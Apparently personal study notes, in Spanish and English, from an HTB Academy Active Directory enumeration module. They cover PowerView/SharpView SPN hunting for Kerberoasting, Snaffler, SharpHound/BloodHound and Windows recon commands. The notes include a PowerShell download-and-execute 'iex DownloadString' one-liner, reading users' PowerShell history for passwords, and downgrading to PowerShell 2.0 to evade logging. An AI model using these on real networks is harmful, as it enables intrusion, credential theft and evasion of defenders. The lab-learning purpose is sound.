> Above, we determined that the user we are currently using is an administrator on the host ACADEMY-EA-MS01. We can perform the same function for each host to see where we have administrative access. We will see later how well BloodHound performs this type of check. Now we can check for users with the SPN attribute set, which indicates that the account may be subjected to a Kerberoasting attack.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/e28fa4d5-c623-4ac9-895b-39c7d3caa4ce)

### Finding Users With SPN Set

```
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/24ea9c3b-2c0e-45e2-b1c0-1916d900cb42)


EL powerview mas actualizado:

> https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1

> PowerView is part of the now deprecated PowerSploit offensive PowerShell toolkit. The tool has been receiving updates by BC-Security as part of their Empire 4 framework. Empire 4 is BC-Security's fork of the original Empire project and is actively maintained as of April 2022. We show examples throughout this module using the development version of PowerView because it is an excellent tool for recon in an Active Directory environment, and is still extremely powerful and helpful in modern AD networks even though the original version is not maintained. The BC-SECURITY version of PowerView has some new functions such as Get-NetGmsa, used to hunt for Group Managed Service Accounts, which is out of scope for this module. It is worth playing around with both versions to see the subtle differences between the old and currently maintained versions.

## SharpView

Otra herramienta con la que vale la pena experimentar es SharpView, una versión .NET de PowerView. Ejecutalo como cualquier otro exe
> SharpView can be useful when a client has hardened against PowerShell usage or we need to avoid using PowerShell.


```
.\SharpView.exe Get-DomainUser -Help
```

### Enum Users

```
.\SharpView.exe Get-DomainUser -Identity forend
```

## Enum shares Snaffler

Enumera todo lo que el usuario tiene acceso al parecer

```
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

> Le -s indica que imprima los resultados en la consola, especifica -del dominio en el que buscar y le -o indica a Snaffler que escriba los resultados en un archivo de registro. La -v opción es el nivel de detalle. Normalmente dataes mejor, ya que solo muestra los resultados en la pantalla, por lo que es más fácil comenzar a revisar las ejecuciones de la herramienta. Snaffler puede producir una cantidad considerable de datos, por lo que normalmente deberíamos enviarlos a un archivo, dejar que se ejecute y luego volver a él más tarde.

lo guarda todo en un el .log

##  BLoodHound desde Windows ( SharpHound.exe)

Ya sabes recolecta todo los datos

```
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

Una vez recopilados los datos se puede abrir la GUI normal desd PS

```
bloodhound
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/185af5af-3ce7-4ab8-b90b-be1494c6708a)

Aprieta el objeto y ve la informacion de la empresa...

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/126a71c0-2586-4e36-80fa-df86f47c0e27)


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/880d5b5a-4f4a-411f-8593-e724d79c945b)


Si vemos los host antiguos no estan activos.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/2d637dd8-0b8f-4a5b-98ed-e9e96374f10d)

### Find Computers where Domain Users are Local Adminpara

Permite ver rápidamente si hay algún host donde todos los usuarios tengan derechos de administrador local. Si este es el caso, entonces cualquier cuenta que controlemos normalmente se puede utilizar para acceder a los hosts en cuestión y es posible que podamos recuperar credenciales de la memoria o encontrar otros datos confidenciales.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/653bd15d-4a11-4089-b987-28cc2a4d4ac7)

### Living of land enum AD ( la mas silenciosa de todas las tecnicas usar comandos de windows)

```
hostname
[System.Environment]::OSVersion.Version # te dice el build version
wmic qfe get Caption,Description,HotFixID,InstalledOn # Te dice los parches instalados
set # muestra las env variables solo en CMD
echo %USERDOMAIN% #Displays the domain name to which the host belongs (ran from CMD-prompt)
echo %logonserver% #CMD Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
systeminfo #Ya sabes
arp -a # Enumera todos los hosts conocidos almacenados en la tabla arp.
route print # Muestra la tabla de enrutamiento (IPv4 e IPv6) que identifica las redes conocidas y las rutas de capa tres compartidas con el host.
```

> En resumen, los hotfixes son actualizaciones específicas de Microsoft diseñadas para resolver problemas, vulnerabilidades o errores específicos en el sistema operativo Windows o en las aplicaciones de Microsoft. Son una parte importante de mantener la seguridad y la estabilidad de un sistema Windows actualizado.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/6e0d46d8-b246-4b0f-988f-bbcd620064a5)


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/3756e296-c4f3-4cb2-8f00-bc7f0aedf1c6)

## Powershell Basics

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/5d6efc91-079f-402c-b903-5763eaac637d)

```
Get-ExecutionPolicy -List # Imprimirá la configuración de la política de ejecución para cada alcance en un host.
Get-ChildItem Env: | ft Key,Value # es como set pero mas ordenado y en PS

Set-ExecutionPolicy Bypass -Scope Process # Esto cambiará la política de nuestro proceso actual utilizando el -Scopeparámetro. Al hacerlo, se revertirá la política una vez que abandonemos el proceso o lo finalicemos. Esto es ideal porque no realizaremos un cambio permanente en el host de la víctima
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt # Con esta cadena, podemos obtener el historial de PowerShell del usuario especificado. Esto puede resultar muy útil ya que el historial de comandos puede contener contraseñas o indicarnos archivos de configuración o scripts que contengan contraseñas.

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" # Esta es una forma rápida y sencilla de descargar un archivo de la web usando PowerShell y llamarlo desde la memoria.

```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/e1341cea-b2ef-4a4b-ad7b-c397f4320634)


### Powershell 2.0

Muchos defensores desconocen que a menudo existen varias versiones de PowerShell en un host. Si no se desinstalan, aún se pueden utilizar. El registro de eventos de Powershell se introdujo como una característica con Powershell 3.0 y posteriores. Con eso en mente, podemos intentar llamar a Powershell versión 2.0 o anterior. Si tiene éxito, nuestras acciones desde el shell no se registrarán en el Visor de eventos. Esta es una excelente manera de permanecer fuera del radar de los defensores y al mismo tiempo utilizar los recursos integrados en los anfitriones para nuestro beneficio. A continuación se muestra un ejemplo de cómo degradar Powershell.


```
Get-Host #
powershell.exe -version 2
``` 

El comando Get-Host en PowerShell se utiliza para obtener información sobre la sesión actual de PowerShell y el entorno de host en el que se está ejecutando. Proporciona detalles sobre la versión de PowerShell, la cultura regional, la configuración de pantalla y otros aspectos relacionados con la sesión en curso.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/2d8877ba-e7e5-457b-9cfc-f3e2e8847a90)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/e0b5862b-e959-457a-99fb-b1f45fb5d702)

> With Script Block Logging enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly.

>  Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0. Notice above in the logs that we can see the commands we issued during a normal shell session, but it stopped after starting a new PowerShell instance in version 2.

## Firewall enum

```
netsh advfirewall show allprofiles
```

## Windows Defender

```
sc query windefend CMD
Get-MpComputerStatus PS
```
> Al acceder a un host por primera vez, una cosa importante es verificar y ver si usted es el único que ha iniciado sesión. Si comienza a realizar acciones desde un host en el que se encuentra otra persona, existe la posibilidad de que se fijen en usted. Si se abre una ventana emergente o se cierra la sesión de un usuario, puede informar estas acciones o cambiar su contraseña, y podríamos perder nuestro punto de apoyo.

```
qwinsta
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/64d86d62-ea40-4583-8f90-bb64b777ca9f)

Para el comando route print:

>  Cualquier red que aparezca en la tabla de enrutamiento es una vía potencial para el movimiento lateral porque se accede a ellas lo suficiente como para agregar una ruta, o se ha configurado administrativamente allí para que el host sepa cómo acceder a los recursos en el dominio. Estos dos comandos pueden ser especialmente útiles en la fase de descubrimiento de una evaluación de caja negra donde tenemos que limitar nuestro escaneo.


